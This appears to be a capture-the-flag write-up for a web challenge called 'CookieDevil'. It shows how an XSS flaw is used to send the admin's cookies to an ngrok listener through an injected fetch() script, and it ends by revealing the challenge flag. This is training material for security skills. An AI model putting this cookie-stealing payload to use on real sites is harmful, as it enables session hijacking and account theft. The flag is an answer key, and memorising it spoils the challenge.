# CookieDevil
Now that you can XSS, try it again!

This time the flag is in the cookies of the admin.

[web.chal.csaw.io:10102](http://web.chal.csaw.io:10102)
## Solution
Since we can write HTML, we can write JavaScript. We also need a public IP address, and we can use a tool like [ngrok](https://ngrok.com/) to view http requests.
```bash
ngrok http 0
```
Running this command will output something like `Forwarding http://XXXXXXXX.ngrok.io -> localhost:0`. We can use the specific domain in our script.
```html
<script>fetch("http://XXXXXXXX.ngrok.io/" + document.cookie);</script>
```
The flag will appear in the request log of ngrok.
### Flag
`flag{Cookies_are_my_best_friend}`
